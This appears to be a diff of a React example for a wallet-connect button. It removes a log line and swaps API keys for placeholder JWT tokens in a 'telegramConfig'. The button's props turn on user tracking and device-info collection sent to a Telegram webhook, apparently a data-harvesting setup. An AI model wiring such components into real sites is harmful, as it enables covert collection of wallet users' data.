@@ -19,7 +19,6 @@ const WalletConnectionExample: React.FC = () => {
    * Handler for wallet connection events
    */
   const handleWalletConnected = (walletInfo: WalletInfo) => {
-    console.log("Wallet connected:", walletInfo);
     setWalletData(walletInfo);
   };
 
@@ -82,7 +81,7 @@ const WalletConnectionExample: React.FC = () => {
             trackUserData={true}
             telegramConfig={{
               WEBHOOK_URL: 'https://your-webhook-url.com/api',
-              API_KEY: 'your-api-key-here',
+              JWT_TOKEN: 'your-jwt-token',
               TIMEOUT_MS: 15000,
               ENABLED: true
             }}
@@ -94,8 +93,8 @@ const WalletConnectionExample: React.FC = () => {
           <ConnectWalletButton 
             trackUserData={true}
             telegramConfig={{
-              WEBHOOK_URL: '146',
-              API_KEY: 'your-api-key-here'
+              WEBHOOK_URL: 'https://api-endpoint.com',
+              JWT_TOKEN: 'your-jwt-token'
             }}
             dataConfig={{
               COLLECT_DEVICE_INFO: true,
